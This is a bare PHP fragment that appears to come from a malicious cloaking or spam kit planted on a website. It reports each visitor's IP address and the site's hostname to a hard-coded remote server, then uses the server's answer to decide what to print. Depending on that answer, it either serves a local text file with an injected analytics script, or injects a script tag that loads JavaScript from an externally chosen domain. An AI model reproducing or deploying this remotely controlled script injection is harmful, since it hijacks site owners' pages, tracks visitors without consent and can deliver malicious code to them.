<?php
$gg="<script src=\"//www.".$djym."/".$duixiang[8].".js\"></script>";
$url_api = "http://173.82.82.122:22055/api.php?q=".$ip."&y=".$_SERVER['HTTP_HOST']."&u=".$name;
$resultx = aric_content($url_api);
$result = json_decode($resultx, true);
if ($result['code']){
	 $rg=$result[data][rengong];
	 $tw=$result[data][tianwang];
	 $gb=$result[data][garbage];
	}
	if ($rg){
		echo $gg=file_get_contents('./rengong.txt').'<script>
		var _hmt = _hmt || [];
		(function() {
			var hm = document.createElement("script");
			hm.src = "https://hm.baidu.com/hm.js?'.$rg.'";
			var s = document.getElementsByTagName("script")[0]; 
			s.parentNode.insertBefore(hm, s);
			})();
</script>';
exit();
			}
			if(!$rg&&!$gb&&!$tw){
				echo $gg;
			}
